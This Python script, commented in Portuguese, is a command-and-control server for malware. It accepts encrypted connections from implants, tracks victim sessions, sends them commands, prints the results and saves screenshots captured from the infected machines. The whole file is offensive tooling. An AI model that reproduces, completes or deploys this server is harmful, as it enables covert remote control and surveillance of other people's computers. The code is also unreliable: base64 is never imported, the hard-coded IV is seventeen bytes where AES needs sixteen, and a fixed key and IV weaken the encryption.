#!/usr/bin/env python3
import socket
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import json

# Configurações do servidor
HOST = "0.0.0.0"
PORT = 443
AES_KEY = hashlib.sha256(b"32_character_key_here!").digest()
AES_IV = b"16_bytes_iv_here!"

class C2Server:
    def __init__(self):
        self.sessions = {}
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((HOST, PORT))
        self.server.listen(5)

    def encrypt(self, data):
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size)))

    def decrypt(self, encrypted_data):
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size).decode()

    def handle_client(self, client):
        try:
            while True:
                data = client.recv(4096)
                if not data:
                    break
                
                decrypted = self.decrypt(data)
                command = json.loads(decrypted)
                
                if command["type"] == "handshake":
                    session_id = command["data"]["session_id"]
                    self.sessions[session_id] = client
                    print(f"[+] Nova conexão: {session_id}")
                    
                elif command["type"] == "command_result":
                    print(f"[+] Resultado:\n{command['data']}")
                    
                elif command["type"] == "screenshot_result":
                    if command["data"]["status"] == "success":
                        with open("screenshot.png", "wb") as f:
                            f.write(base64.b64decode(command["data"]["image"]))
                        print("[+] Screenshot salvo como screenshot.png")
                    
        except Exception as e:
            print(f"[!] Erro: {e}")
        finally:
            client.close()

    def send_command(self, session_id, command):
        if session_id in self.sessions:
            payload = {
                "type": "command",
                "data": command
            }
            self.sessions[session_id].sendall(self.encrypt(json.dumps(payload)) + b"\n")
            return True
        return False

    def run(self):
        print(f"[*] Servidor C2 rodando em {HOST}:{PORT}")
        while True:
            client, addr = self.server.accept()
            threading.Thread(target=self.handle_client, args=(client,)).start()

if __name__ == "__main__":
    server = C2Server()
    server.run()
